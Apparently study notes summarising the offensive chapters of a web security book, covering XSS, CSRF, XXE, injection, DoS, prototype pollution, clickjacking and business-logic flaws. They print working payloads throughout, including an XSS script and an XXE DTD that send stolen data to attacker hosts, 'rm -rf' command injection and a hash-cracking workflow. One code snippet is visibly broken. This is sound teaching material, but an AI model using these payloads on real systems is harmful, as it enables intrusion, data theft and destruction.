Scope

Everything in Part II is described for authorised testing, red-teaming and defence — the book says this repeatedly. Only test systems you own or have explicit written permission to test.

Why a defender should read Part II at all

Each chapter ends with an implicit question about your own application: does any endpoint take a string and put it in the DOM? Does any state change work over a GET? Does any parser accept XML? Does any query get built by concatenation? Part III answers those questions with fixes; Part II is where you learn which fixes actually matter — and the book warns in its own summary that defences are “mitigations”, not bulletproof fixes.

Chapter 9 · Introduction to Hacking Web Applications

Hacking is mostly reading and pattern-spotting, not magic: engineers measure a day by features shipped, hackers measure it by clues found.

The hacker’s mindset

  • Productivity looks different. A developer says “I shipped features x and y”. A hacker’s day is mostly data gathering and analysis, full of false positives — it looks like wasted time to an outsider.
  • Hackers rarely modify software. They analyse the existing codebase and look for entry points that are already there.
  • Every codebase contains exploitable bugs. A good hacker stays alert for clues rather than for a specific bug.
  • Long dry spells are normal. Weeks or months of analysis before a usable entry point appears — so keep a record of what you tried and what you learned.
  • Keep learning. Techniques go stale as the web adapts.
  • The ladder: a hacker is a detective; a good hacker is an organised detective; a great hacker adds technical skill; a master hacker keeps adapting.

Applied recon — why Part I is not over

  • API type — most payloads in Part II are delivered over REST APIs, so knowing that an app is REST-first tells you how to shape a request.
  • Endpoints — one endpoint that ignores your permission may not be interesting; /users/1234/settings probably is.
  • Code reuse across a company — an exploit found on one subdomain often works on another, because teams copy each other.
  • Authentication scheme — authenticated users get a superset of functionality, and those requests run with more privilege, so most interesting attacks happen inside a session.
  • Dependencies — public exploits against third-party libraries are often copy-and-paste jobs.
  • Architecture — if application B is untouchable but application A talks to it, attack A to reach B.
The book’s framing

Recon and offence are each interesting on their own, and far more valuable together. Part II exists because a payload with no target is useless, and a target with no payload is just a map.

Chapter 10 · Cross-Site Scripting (XSS)

XSS is what happens when your application’s data becomes your application’s code: the browser executes the attacker’s script with all the powers your own JavaScript has, inside a real user’s session.

The book opens with a story that makes the whole class obvious. An unhappy customer types feedback into MegaBank’s support portal. The form has no bold button, so they try HTML:

The innocent version — a customer just wants bold textbook example
I am not happy with the service provided by your bank.
I have waited 12 hours for my deposit to show up in the web application.
<strong>Please improve your web application.</strong>
Other banks will show deposits instantly.

It works — the text is bold. The support rep even asks how. That single success proves the application renders user input as DOM instead of text, and the same door takes a script:

  • Submit User sends a comment through a web form.
  • Store The comment is saved in the database as text.
  • Retrieve One or many users request the comment over HTTP.
  • Inject The comment is placed into the page — as markup.
  • Execute The browser interprets the injected markup as DOM and runs the script.

And this is the developer habit that causes it — one line, innerHTML:

The exact mistake: appending a string as DOM instead of as textvulnerable
const comment = 'my <strong>comment</strong>';
const div = document.createElement('div');
div.innerHTML = comment;          // interpreted as DOM, not text

const wrapper = document.querySelector('#commentArea');
wrapper.appendChild(div);

Then the book turns the same bug into an actual weapon. Posted as a support comment, this script runs in the support rep’s browser, reads the privileged customer data on that screen and posts it to the attacker’s server:

Stored XSS payload — exfiltrating the support rep’s datamalicious payload
<script>
  // get a list of all customers from the page
  const customers = document.querySelectorAll('.openCases');
  const customerData = [];

  customers.forEach((customer) => {
    customerData.push({
      firstName: customer.querySelector('.firstName').innerText,
      lastName:  customer.querySelector('.lastName').innerText,
      email:     customer.querySelector('.email').innerText,
      phone:     customer.querySelector('.phone').innerText
    });
  });

  // exfiltrate the collected data to the attacker's server
  const http = new XMLHttpRequest();
  http.open('POST', 'https://steal-your-data.com/data', true);
  http.setRequestHeader('Content-type', 'application/json');
  http.send(JSON.stringify(customerData));
</script>
Why this is so nasty

The script tags are invisible in the rendered comment — the rep sees only the polite complaint. No click required: a script tag that reaches the DOM is executed immediately. And because the payload is stored, every rep who opens the comment is attacked.

What an XSS attack can do

  • Run a script in the browser that the application owner never wrote.
  • Run silently, with no visibility and no user interaction to start it.
  • Read any data present in the current page — often more than the victim realises.
  • Send data out, and pull further code in, from the attacker’s server.
  • Steal session tokens → account takeover.
  • Draw DOM elements over the real UI → near-perfect phishing that a non-technical user cannot detect.

Stored, reflected, DOM-based — and mutation-based

The book introduces the big three (stored, reflected, DOM-based) and later adds a fourth (mutation-based). The mental model:

  • Stored — easiest to detect (it sits in your database) and often the most dangerous (one payload, many victims). A featured video title with a stored XSS could hit every visitor for as long as it is featured. Because the payload is stored server-side as text, scanning database entries for script is a cheap mitigation — but not a fix: payloads can be encoded (base64, binary) or split across fields and only become dangerous when a service concatenates them.
  • Reflected — the server echoes the payload back without storing it. Harder to find, easier to disguise: the book shows a page of three “helpful” links where the third carries the payload in a query string.
  • DOM-based — no server involvement at all: a source (something that holds text, e.g. window.location.hash) flows into a sink (something that executes text, e.g. document.write or innerHTML).
  • Mutation-based (mXSS) — the payload passes the filter, then the browser’s parser “corrects” it into something executable.

DOM XSS: hash (source) → document.write (sink), no server involvedvulnerable
const hash = document.location.hash;

Why DOM XSS is the hardest to catch

The traffic never leaves the browser, so server-side scanners see nothing. It also depends on the browser and version: a bug in one DOM implementation may not exist in another, so a company supporting many browsers can struggle even to reproduce the report.

Mutation-based XSS (mXSS)

Named by Mario Heiderich’s paper on innerHTML mutations. The idea: a payload that is safe when the filter inspects it, and unsafe after the browser has optimised and re-parsed the DOM. The book’s example is Masato Kinugawa’s 2019 bypass of DOMPurify inside Google’s Closure library:

The payload that looked safe… and what the browser made of itmXSS
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// after the browser re-parses it:
<noscript><p title="</noscript>
<img src="x" onerror="alert(1)">">

Why it worked: DOMPurify sanitises inside a <template> element, where scripting is disabled. In that context <noscript> exposes its children as elements, so the img onerror could not fire. Once the string left the sanitizer and entered a real browser (scripting enabled), <noscript> stopped doing anything, the broken <p title=" was discarded, and the image handler became live. Filters that were considered robust — DOMPurify, OWASP AntiSamy, Google Caja — have all been bypassed this way.

Bypassing filters

Only a small fraction of sites use best-in-class sanitisation, so most filters are homemade blocklists — and the DOM/JS specs are big enough to walk around them.

Chapter 11 · Cross-Site Request Forgery (CSRF)

CSRF doesn’t steal the session — it borrows it. The victim’s own browser, already logged in, is tricked into sending a request the victim never intended.

The two identifying marks of a CSRF attack, per the book: privilege escalation (an action the attacker could not perform alone) and stealth (the account that performs it never knows). It works because browsers automatically attach a site’s cookies to any request that site receives — no matter who wrote the page that triggered the request.

Anatomy of the request

A GET is just a line of text — which is what makes it so forgeablebook code
GET /resource-url?key=value HTTP/1.1
Host: www.mega-bank.com

The book then builds the vulnerable server in ExpressJS, first harmlessly:

A harmless reflective route (and what it teaches)book code
app.get('/account', function(req, res) {
  if (!req.query) { return res.sendStatus(400); }
  return res.json(req.query);
});

…and from the browser, with and without params:

Same request, with params attachedbook code
const xhr = new XMLHttpRequest();
const params = 'id=12345';
xhr.onreadystatechange = function() {
  console.log(xhr.responseText);
};
xhr.open('GET', `https://www.mega-bank.com/account?${params}`, true);
xhr.send();

// response: { id: 12345 }  with HTTP 200

Now the same pattern, but the query parameters change state — a money transfer:

The dangerous version: a GET that moves moneyvulnerable
app.get('/transfer', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }
  if (!req.query.to_user) { return res.sendStatus(400); }
  if (!req.query.amount)  { return res.sendStatus(400); }

  transferFunds(session.currentUser, req.query.to_user, req.query.amount,
    (error) => {
      if (error) { return res.sendStatus(400); }
      return res.json({
        operation: 'transfer',
        amount: req.query.amount,
        from: session.currentUser,
        to: req.query.to_user,
        status: 'complete'
      });
    });
});

The route checks privileges and checks that a recipient exists — so it looks secure. But it never verifies that the person clicking meant to do it, and a GET can be triggered by anything:

The one-line attack linkpayload
<a href="https://www.mega-bank.com/transfer?to_user=attacker&amount=10000">click me</a>

Alternate GET payloads

Any tag with an src makes the request as soon as it loads — no click needed. An invisible pixel is enough:

An 0×0 image that transfers moneypayload
<img src="https://www.mega-bank.com/transfer?to_user=attacker&amount=10000"
     width="0" height="0" border="0">

<video width="1280" height="720" controls>
  <source src="https://www.mega-bank.com/transfer?to_user=attacker&amount=10000"
          type="video/mp4">
</video>

CSRF against POST endpoints

POST requires a little more work and, usually, one user interaction — because a plain HTML form can POST without any JavaScript:

Hidden fields do the damage; visible fields do the actingpayload
<form action="https://www.mega-bank.com/transfer" method="POST">
  <input type="hidden" name="to_user" value="attacker">
  <input type="hidden" name="amount"  value="10000">
  <input type="text"     name="username" value="username">
  <input type="password" name="password" value="password">
  <input type="submit"   value="Submit">
</form>

The victim sees a plausible login form; submitting it never logs in anywhere — it fires the transfer, using the session the victim already has at MegaBank. The book also notes a variant that reaches internal networks: the attacker cannot reach the intranet, but the victim’s browser can, so a form submitted by an insider makes the request for them.

Bypassing CSRF defences

  • Header validation — defences that check Referer or Origin can be defeated by removing the header: rel="noreferrer" on a link or a form makes the browser omit the referrer, and the server then compares against null/undefined. The book’s blunt opinion: headers are easily forged or stripped and should not be a first-line security measure.
  • Token pools — if tokens are validated from a shared pool rather than tied to a session, you can mint a valid token from your own account and reuse it. Tokens are also readable from DevTools on a test account.
  • Weak tokens — predictable tokens (dates, times, usernames, counters) are forgeable. The book’s example: 1691434927 and 1691434928 are just Unix timestamps.
Replaying a “valid” token of your ownbook code
curl https://website.com/auth -H "anti-csrf-token": "12345abc"

Chapter 12 · XML External Entity (XXE)

XML lets a document define its own entities. If the parser resolves external ones, the document can read files off your server — or send them to the attacker.

XML documents can reference entities declared in a document type definition (DTD). Some are built in; the dangerous ones are custom, and the most dangerous of all point outside the document:

One line of XML that reads a Linux password filepayload
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>

Direct XXE — the app parses your XML and answers with it

The book’s example is a “send screenshot to support” feature: the browser serialises the current page DOM to XML, posts it to a utility service that converts XML → JPG, and forwards the image to support.

Client: serialise the DOM and post it as XMLbook code
const screenshot = function() {
  try {
    const div = document.getElementById('content').innerHTML;
    const serializer = new XMLSerializer();
    const dom = serializer.serializeToString(div);

    const xhr = new XMLHttpRequest();
    const url = 'https://util.mega-bank.com/screenshot';
    const data = new FormData();
    data.append('dom', dom);

    xhr.onreadystatechange = function() {
      sendScreenshotToSupport(xhr.responseText, (err) => {
        if (err) { alert('could not send screenshot.'); }
        else     { alert('screenshot sent to support!'); }
      });
    };
    xhr.send(data);
  } catch (e) {
    alert('Your browser does not support this functionality. Consider upgrading.');
  }
};
Server: receives the XML and hands it to a parserbook code
import xmltojpg from './xmltojpg';

app.post('/screenshot', function(req, res) {
  if (!req.body.dom) { return res.sendStatus(400); }
  xmltojpg.convert(req.body.dom)
    .then((err, jpg) => {
      if (err) { return res.sendStatus(400); }
      return res.send(jpg);
    });
});

Under normal use this is harmless. But the “DOM” being sent is just a string, and a client can send any string it likes — no browser required:

Forging the request with your own XMLpayload
const xhr = new XMLHttpRequest();
xhr.open('POST', utilAPI.url + '/screenshot');
xhr.setRequestHeader('Content-Type', 'application/xml');

const rawXMLString = `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><xxe>&xxe;</xxe>`;

xhr.onreadystatechange = function() {
  if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
    // check response data here
  }
};
xhr.send(rawXMLString);

If the parser has external entities enabled, the “screenshot” comes back containing the text of /etc/passwd.

Indirect XXE — you never send XML at all

An API can accept plain JSON and still use an XML parser internally: the server converts your payload to XML because the enterprise system it talks to (CRM, accounting, HR) only speaks XML. That conversion is invisible from outside — and still vulnerable. Discovering it takes inference: research the company’s known enterprise vendors, look for third-party URLs, or notice data formats that only make sense if an old system is behind the API.

Out-of-band exfiltration

Sometimes the response contains nothing useful even though the parser is vulnerable. Then you make the server send the data to you. Host a DTD on your own server, reference it from the payload, and have it stream a file out over FTP (or HTTP/LDAP in some environments):

Payload → your DTD → your FTP logspayload
<?xml version="1.0"?>
<!DOCTYPE a [
  <!ENTITY % dtd SYSTEM "https://evil.com/data.dtd">
  %asd;
  %c;
]>
<a>&rrr;</a>

<!-- data.dtd, hosted on the attacker's server -->
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://evil.com/%d;'>">

The account-takeover workflow

The book’s most powerful XXE pattern: a chain of small file reads that ends in a shell.

  • Read /etc/passwd — one line per user, seven colon-separated fields: username, password location (x = hash lives in /etc/shadow), UID, GID, comment, home directory, shell. This alone leaks accounts, homes and groups.
  • Read /etc/shadow — line two of each entry holds the hash as $id:$salt:$hash. The $id tells you the algorithm: $1$ MD5, $2a$/$2y$ Blowfish, $5$ SHA-256, $6$ SHA-512, $y$ yescrypt.
  • Crack the hash — format the two files with unshadow, then run John the Ripper or Hashcat. This is CPU/GPU-heavy: John uses one or the other, Hashcat can use both.
  • Log in — with username and password, ssh user@host. The attacker now controls a real account on the server.
The cracking workflow in five linesbook code
# 1. save the stolen files locally
passwd.txt   shadow.txt

# 2. merge them into a format the cracker understands
unshadow passwd.txt shadow.txt > passwords.txt

# 3. crack, then show the plaintext
john passwords.txt
john --show passwords.txt
The lesson for defenders

XXE is often a one-line misconfiguration and needs no exploit chain at all — which is exactly why it is worth trying on every application that touches XML, and why disabling DTDs and external entities is such a cheap fix.

Chapter 13 · Injection

Injection always has two parts: an interpreter and a payload fed into it. SQL is the famous case, but a CLI or the operating system works just as well.

SQL injection

The book starts with PHP — because PHP’s relaxed mixing of SQL, HTML and logic produced a generation of vulnerable code. An old-school login:

Old-school PHP login: SQL built by concatenationvulnerable
<?php
  // ... form HTML, then on POST:
  $database = new mysqli($servername, $username, $password, $database, $dbport);

  $sql = "SELECT userId, username, admin, moderator FROM users WHERE username = '"
       . $_POST['username'] . "' AND password = '" . sha1($_POST['password']) . "';";

  $result = mysqli_query($database, $sql);
?>

This is also why injection numbers fell: as PHP tightened its standards and lost popularity, SQL injection dropped from nearly 5% of all vulnerabilities in 2010 to under 1% today (NVD). The lesson survived into other languages — but the same mistake is easy to make in a modern Node service:

The same bug in a Node/Express endpointvulnerable
app.post('/users', function(req, res) {
  const user_id = req.body.user_id;

  await sql.connect('mssql://username:password@localhost/database');
  const result = await sql.query('SELECT * FROM users WHERE USER = ' + user_id);

  return res.json(result);
});

Three payloads, three levels of damage:

From “show me everything” to “change my account”payloads
// 1. truthy — returns every user
user_id = '1=1'
// SELECT * FROM users WHERE USER = true

// 2. destructive — appends a second statement
user_id = '123abc; DROP TABLE users;'
// SELECT * FROM users WHERE USER = 123abc; DROP TABLE users;

// 3. quiet escalation — give yourself credits
user_id = '123abc; UPDATE users SET credits = 10000 WHERE user = 123abc;'

Code injection — the interpreter need not be SQL

Most applications use a database, so most injection is SQL. But any interpreter reachable from an API is a target. The book’s example is a media service with uploadImage, uploadVideo, getImage and getVideo:

uploadImage: the filename is the injection pointbook code
app.post('/uploadImage', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  // write the raw image to disk
  fs.writeFileSync(`/images/raw/${req.body.name}.png`, req.body.image);

  const compressImage = async function() {
    const res = await imagemin([`/images/raw/${req.body.name}.png`],
                                `/images/compressed/${req.body.name}.jpg`);
    return res;
  };

  const res = await compressImage();
  return res.status(200)
    .json({ url: `https://media.mega-bank.com/images/${req.body.name}.jpg` });
});

It looks like a badly written API endpoint with a filename-collision edge case: send name = main_logo.png and you overwrite the front page’s logo. But imagemin invokes imagemin-cli — so this is injection through an unsanitised CLI.

The video endpoint makes the pattern explicit — user-controlled options are concatenated into a shell command:

Options appended straight into a commandvulnerable
const defaultOptions = '-s 1280x720';

app.post('/uploadVideo', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  const videoData = req.body.video;
  const videoName = req.body.name;
  const options   = defaultOptions + req.body.options;

  exec(`convert -d ${videoData} -n ${videoName} -o ${options}`);
});
Valid options… and then the same field used to add a commandpayload
const options = '-c h264 -ab 192k';                               // intended
const options = '-c h264 -ab 192k \\ convert -dir /videos -s 1x1'; // injected

Whether injected text starts a new command depends on the CLI: some accept several commands per line, others break on newlines, spaces or &&. And if the command runs in Bash rather than inside a contained tool, escaping one quote is enough to reach the OS itself:

Code injection becomes command injectionpayload
const options = "' && rm -rf /videos";

// what the host OS then runs:
$ convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720' && rm -rf /videos

Why command injection is the worst case

Over 95% of servers are Unix-based, so shell access usually means access to files like /etc/passwd, /etc/shadow, ~/.ssh (keys to other systems), /etc/apache2/httpd.conf and /etc/nginx/nginx.conf — read and write. From there the book lists the escalation ladder: steal data, rewrite logs to hide tracks, add a database user for later, delete files, wipe the box, abuse the server’s integrations (e.g. its Sendgrid keys for spam), turn a login form into a phishing form, or lock the admins out and blackmail them.

A “safe converter” that still ends in a shellvulnerable
app.post('/uploadVideo', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  fs.writeFileSync(`/videos/raw/${req.body.name}`, req.body.video);

                         `/videos/converted/${req.body.name}`)
    .then(() => {
      // the cleanup line is the vulnerability
      exec(`rm /videos/raw/${req.body.name}`);

Bypassing defences: blocklists are the usual improvised defence for non-SQL interpreters (CLIs have no prepared statements). They are weak because specs change and inputs can be masked — the same command can be written many ways that a keyword filter will not recognise.

Chapter 14 · Denial of Service

Availability is part of security. If one cheap request can burn a lot of your server, the attacker wins — no data theft required.

Regex DoS

Regular expressions validate fields everywhere, and they are usually fast. But a “greedy” regex can be crafted to backtrack catastrophically. The book’s demonstration pattern is /^((ab)*)+$/:

Same regex, two inputs — one harmless, one exponentialbook example
/^((ab)*)+$/

'ababababababab'    → instant    // valid: matches cleanly
'abababababababa'   → very slow  // one extra 'a' forces exhaustive backtracking

With a failing trailing character, the engine tries every possible grouping — (abababababababa), (ababababababa)(ba), … — before concluding the string does not match. The measured growth is brutal:

Malicious input (odd length)Execution timeSafe input (even length)Execution time
23 chars8 ms22 chars<1 ms
25 chars15 ms24 chars<1 ms
27 chars31 ms26 chars<1 ms
29 chars61 ms28 chars>1 ms

Time doubles roughly every two characters. On a server that gets expensive fast; in a browser it can freeze the tab entirely. The nasty part: the vulnerable regex can sit in production for years, harmless until someone finds the matching input — so OSS is disproportionately exposed, because few reviewers can spot a malicious regex.

Logical DoS

Here the attacker abuses normal features to make the server do expensive work. First look for resource-heavy operations: anything synchronous, database writes, disk writes, SQL joins, backups, loops.

One request that triggers four expensive thingsbook example
POST /uploadPhoto
  → database write   (photo metadata)
  → disk write       (upload log)
  → SQL join         (user + albums + metadata)
  → file backup      (disaster recovery copy)

You cannot time the server’s internals directly, but you can scale the work by scaling your account. The book’s measurement of GET /metadata/:userid:

Account archetypeResponse time
New account (1 album, 1 photo)120 ms
Average account (6 albums, 60 photos)470 ms
Power user (28 albums, 490 photos)1,870 ms

So the attacker inflates an account (600 albums, 3,500 photos — scripted re-uploads) and then hammers that one endpoint. Even if the request times out, the database is often still working.

Distributed and advanced variants

  • DDoS — botnets (real machines owned by real people, controlled by malware) hammer the IP rather than a specific endpoint, usually with raw UDP traffic to exhaust bandwidth. Hard to block because the traffic looks like real users.
  • YoYo attacks — abuse autoscaling: flood → the cloud scales up → stop → it scales down → repeat. The user experience degrades during every reallocation and your cloud bill explodes. Denial of wallet.
  • Compression attacks — a malformed upload that makes the compressor (FFMPEG, ImageMagick) burn CPU and memory. The book cites CVE-2021-38094: a crafted video triggering an integer overflow in FFMPEG 4.1’s filter_sobel() (in libavfilter/vf_convolution.c), leading to runaway CPU/memory and a crash. Third-party upload handlers are a huge surface area.
  • Proxy-based DoS — use someone else’s compute: create thousands of subdomains proxying to the target so search-engine crawlers keep re-indexing the same content, pushing their traffic at the victim. The attacker pays nothing.
Where to look

The book’s advice: work out which server resources are most valuable for this application — usually RAM/CPU, but sometimes something bespoke like a queue (user a → user b → user c) — then find the APIs that consume them.

Chapter 15 · Attacking Data and Objects

Objects are first-class citizens: they can be created, passed, merged and returned. That convenience is also the attack surface.

Mass assignment

Also called autobinding (Spring MVC, ASP.NET) or object injection (legacy PHP). The bug: a function accepts an object and trusts every key in it.

MegaGame: the endpoint and the unvalidated writervulnerable
app.post("updatePlayerData", function(req, res, next) {
  if (!!req.body.data) {
    db.update(session.currentUser, req.body.data);
    return res.sendStatus(200);          // success
  } else {
    return res.sendStatus(400);          // error
  }
});

const update = function(data) {
  for (const [key, value] of Object.entries(data)) {
    database.upsert({ `${key}`: `${value}` });
  }
};

The problem is not the upsert — it is the missing key validation. The developer expects game state; the attacker adds one field:

The payload is one extra keypayload
const data = {
  playerId: 123,
  playerPosition: { "x": 125, "y": 346 },
  playerHP: 90,
  isAdmin: true          // ← the attack
};

The update() loop happily writes isAdmin into the user row: privilege escalation from a single extra JSON key.

Insecure Direct Object Reference (IDOR)

Added to the OWASP Top 10 in 2007, less common now, still trivially easy: the server trusts an identifier supplied by the user without checking that this user may touch that object.

A file endpoint that returns whatever you namevulnerable
app.get('/files/:id', function(req, res, next) {
  return res.sendFile(`/filesystem/files/${req.params.id}`);
});

// intended:  GET https://mywebsite.com/files/my-report-card.txt
// attack:    GET https://mywebsite.com/files/other-report-card.txt

Intercept the request (DevTools, Burp Suite, ZAP) and change the filename. If it comes back, you have read someone else’s data — a privilege escalation achieved by editing one string.

Serialization attacks

Data has to be serialised to travel. When a serializer fails to escape its output properly, the resulting blob can execute when something downstream evaluates it:

The serialized-farmer idea: an object becomes a string, then backbook example
{
  "name": "Joe Carrot",
  "age": 62,
  "location": "Montana, USA",
  "crops": { "wheat": { "measurement": "acres", "amount": 100 } }
}

The worked example: npm’s serialize-javascript (30M+ weekly downloads) below version 3.0.9. Input {"foo": /1"/, "bar": "a\"@__R-<UID>-0__@"} produced JSON that re-introduced an unescaped quote; if that output is later passed through eval(), the escaped structure becomes code. The book’s proof of concept:

Serializer output + eval = executionpayload
eval('(' + serialize({"foo": /1" + console.log(1)/i,
                     "bar": '"@__R-<UID>-0__@'}) + ')');
  • Find a function that serialises data.
  • Read or test it with common payloads.
  • Spot the escaping failure and craft a payload that becomes executable.
  • Deliver it through the serializer.
  • Collect the result: RCE on the server, or XSS in the browser.

Chapter 16 · Client-Side Attacks

Attacks that never touch your server — which is exactly why mature organisations find them so hard to see.

The chapter’s history lesson matters: in Web 1.0 the client was assumed safe because it did nothing. Web 2.0 pushed computation, state and storage (localStorage, sessionStorage, IndexedDB) into the browser, so the client is now a real application — and a real target.

Two flavours of client-side attack

  • Client-targeted — a general bug class that can hit client or server, e.g. ReDoS that freezes the browser instead of the server.
  • Client-specific — bugs that exist only in the browser, e.g. DOM XSS, prototype pollution, clickjacking, tabnabbing.
Why attackers love them

Download the HTML/CSS/JS once, switch the network off, and try a million payloads locally — nothing reaches the victim’s servers, so nothing shows up in logs, WAFs or anomaly detection. It is also where less testing has happened, so bugs survive longer.

Prototype pollution

JavaScript inheritance is a chain: Bob → Technician → Object. If a function or property is missing on an object, the interpreter walks up the chain until it finds it. That is why Bob.toString() works even though nothing defined it on Bob. The attack is to write into the shared part of the chain:

Polluting the prototype from outside the target objectpayload
const Technician = function(name, birthdate, paymentId) {
  this.name = name;
  this.birthdate = birthdate;
  this.paymentId = paymentId;
};
const Bob = new Technician("Bob", "12/01/1970", 12345);

// the vulnerable helper the UI exposes
const addTechnicianFunctionality = function(obj) {
  Technician.prototype[obj.name] = obj.data;
};

// attacker input
{ name: "toString", data: `function() { console.log("polluted!"); }` }

Bob.toString();   // prints "polluted!"

The book demonstrates the same via the npm merge package (v2.0). Note the difference between a harmless-looking merge and a polluting one:

Normal merge vs prototype merge vs constructor mergepayloads
merge(Object, { isAdmin: true });
console.log(Bob.isAdmin);                     // undefined

merge(Object, { "__proto__.isAdmin": true });
console.log(Bob.isAdmin);                     // true

merge(Object, { "constructor.prototype.isAdmin": true });
console.log(Bob.isAdmin);                     // true

Three outcomes follow, in increasing severity:

OutcomeWhat it looks like
Denial of serviceA value changes type (float instead of integer) and breaks logic downstream
Property injectionA function reads a value you control and calls something it should not
Code executionEscalates to XSS in the browser, or true RCE on a Node.js server, via a sink like eval() or DOMParser.parseFromString()

Clickjacking

The attacker frames your site invisibly and puts their own UI on top, so real clicks land on your real buttons. The book’s famous example is the 2008 Adobe Flash camera-and-microphone hijack: a game page with an invisible, framed Flash settings page underneath, so every click granted hardware permissions.

The whole attack: invisible iframe + click-through buttonpayload
<div id="clickjacker">
  <span id="fake_button">click me</span>
</div>
<iframe id="target_website" src="target-website.com"></iframe>

<style>
  #target_website { opacity: 0; }              /* invisible victim site */
  #fake_button {
    position: relative; right: 25px; top: 25px;
    pointer-events: none;                      /* clicks pass through */
    background-color: blue;
  }
</style>

Because the iframe is the real site, it still has the victim’s cookies — so the click can trigger a privileged API call: make a profile public, confirm a payment, change a password.

Tabnabbing and reverse tabnabbing

Traditional tabnabbing

The attacker’s page opens the legitimate site in a new tab and keeps a handle to it, then later swaps that tab for a look-alike phishing page — after the user has already “verified” it.

Open a tab, wait, replace itpayload
const goToLegitWebsite = function() {
  const windowObj = window.open("https://website-b.com");

  setTimeout(() => {
    windowObj.location.replace("https://website-c.com");
  }, 1000 * 60 * 5);   // 5 minutes later
};

Reverse tabnabbing

The attacker is the new tab and reaches back at the opener. Three delivery routes, from most to least direct:

opener / target=_blank / parentpayloads
// 1. window.open()
window.opener.location.replace("https://get-hacked.com");

// 2. a link with target="_blank"
<a href="https://evil.com" target="_blank">click</a>

// 3. an iframe without sandbox/CSP
window.parent.location.replace("https://get-hacked.com");

The root cause is a DOM design choice: a new tab is handed a reference to the tab that opened it. If the opened page is hostile, it can navigate — or replace — the page the user trusts.

Chapter 17 · Exploiting Third-Party Dependencies

A chain is only as strong as its weakest link — and dependencies are usually the link that got the least review.

Almost everything runs on open source: Reddit (BackboneJS, Bootstrap), Twitch (Webpack, nginx), YouTube (Polymer), LinkedIn (EmberJS), Office Web (Angular), Amazon DocumentDB (MongoDB). Many companies now sell support around an OSS product: Automattic/WordPress, Canonical/Ubuntu, Docker, Elastic/Elasticsearch, GitLab, Mongo.

Why that is a security problem: a large OSS codebase is effectively unauditable. You would have to onboard security engineers onto unfamiliar code, then do a point-in-time review — which goes stale on the next pull request. Most companies accept the risk instead. That gap is the attacker’s opening.

How integrations are actually built (and how each one fails)

MethodShapeSecurity trade-off
Branch of upstreamRun your own branch of the OSS projectEasy to pull fixes, but also easy to pull unreviewed upstream code into production
ForkA separate repository from the last commitOwn permissions, own hooks, real separation — but merging upstream gets harder as the fork drifts
Self-hosted / installerOne-click install (WordPress is the classic)Most risky: the script runs with elevated privileges, sets up databases, and leaves you unsure where the files are
Direct sourceCopy-paste code into your repoIdeal for 50–100-line helpers; no notification of upstream fixes, and dependencies come with it
Package managernpm, Maven, NuGet, Conan, Spack…Convenient and cached, but you inherit an entire recursive dependency tree you never read

Package manager attacks

  • left-pad (2016) — one person’s tiny utility was unpublished and broke the build pipeline of millions of apps. npm now restricts unpublishing.
  • eslint-scope (2018) — a compromised maintainer account published a version that stole local credentials from every machine that installed it.
  • event-stream (2018) — a new transitive dependency, flatmap-stream, shipped code that stole Bitcoin wallets.
  • Mechanics — either a malicious package, or a malicious dependency of a legitimate package. Both require a mix of social engineering and obfuscation so the code is not obvious in review.
The asymmetry the book points out

CVE databases are brilliant for huge projects (jQuery: 10M+ sites, 250+ contributors, ~7,000 commits, 150 releases — all heavily scrutinised) and nearly useless for a two-contributor repo with 300 downloads. Popularity buys you documentation, in both directions.

Chapter 18 · Business Logic Vulnerabilities

No scanner will find these. The code works exactly as written — the rules are what can be bent, and that is where the money is.

The book draws a clean line: application logic is generic (render an image, make a network call), while business rules are specific (“a passenger may cancel only if the current time is more than 24 hours before the booking”). A bug in the second is a business-logic vulnerability: hard to find, impossible to automate, often the most valuable.

Custom maths — the transfer that forgets to check the balance

  1. User A asks to send $500 to User B.
  2. The server confirms User B exists.
  3. The server asks User A to confirm. User A accepts.
  4. The server subtracts 500 from User A.
  5. The server adds 500 to User B.
  6. The server confirms completion.

Notice what is missing: nobody checked that User A has $500. Best case, a database constraint rejects it. Worst case, A’s balance stops at $0 while B keeps gaining $500 per transaction — and A and B are the same person.

The two requirements

An application is a great target if it lacks either (a) the correct maths for its business rules, or (b) validation of the inputs to that maths. Static analysis will not flag it, because “correct” depends on the bank’s own model.

Programmed side effects — the MegaCrypto squeeze

MegaCrypto (MegaBank’s crypto exchange) prices coins by local market demand: MegaCoin $1, ByteCoin $50,000, DoggoCoin $5, GhostCoin $2,000, HardDriveCoin $10. Each night it refills liquidity by buying first from its own users, then from another exchange.

Henry Hacker spots the design flaw: the local liquidity pool (~$1M total) is tiny compared with the global market, and local prices are assumed to track global ones. He pools $1M, buys 20 ByteCoin at $50,000 each overnight — the same night the exchange is buying from local users at that rate — and immediately lists them at $100,000. He wakes up with $2M.

Nobody broke a rule. The application did what it was told. The missing logic was an edge case: only repurchase local coins if the price is within a percentage of the global average.

Quasi-cash attacks — the 4% money machine

MegaCard: 25% APR, $0 annual fee, 5% cash back on everything for three years. Henry has a merchant account on PayBuddy (1% fee). The loop:

  • Invoice $1,000 of “consulting” on PayBuddy.
  • Pay the invoice with his own MegaCard.
  • Net position $990 in the merchant account, $1,000 charged to the card.
  • Reward 5% of $1,000 = $50 lands in his bank account.
  • Withdraw the $990 to the same bank account.
  • Result $1,040 out of a $1,000 charge: +$40 per cycle.

Automate one cycle per minute and that is $2,400/hour, $57,600 in a day — and technically the card worked as designed. The missing check: a cardholder who is also a merchant, paying himself, at machine speed. The intermediary (PayBuddy) was not a bank, so the “cash” was just database fields until settlement — hence quasi-cash.

Vulnerable standards and conventions — floating point

Almost every mainstream language uses IEEE 754 doubles. Open a console and type 0.1 + 0.2:

The first thing every tester should type in a consolebook example
0.1 + 0.2        // 0.30000000000000004

A loss of 4×10⁻¹⁶ per operation. Add once per balance reload and nothing happens for years; multiply or exponentiate in a financial calculation and it compounds. Because maths is standardised, this is a reliable place to hunt: you know how the language behaves before you ever see the server.

How to actually find them

  • Become the archetypal customer first — think like the person buying groceries with MegaCard.
